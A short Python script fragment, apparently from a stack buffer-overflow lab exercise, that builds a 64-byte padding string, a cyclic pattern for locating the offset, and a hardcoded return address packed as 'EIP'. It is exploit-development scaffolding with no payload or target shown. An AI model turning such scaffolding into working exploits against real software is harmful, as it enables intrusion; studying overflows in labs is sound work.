import struct

pad = "\x41" * 64

string = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaq"

print(len(string))

EIP = struct.pack("I",0xbffff780)
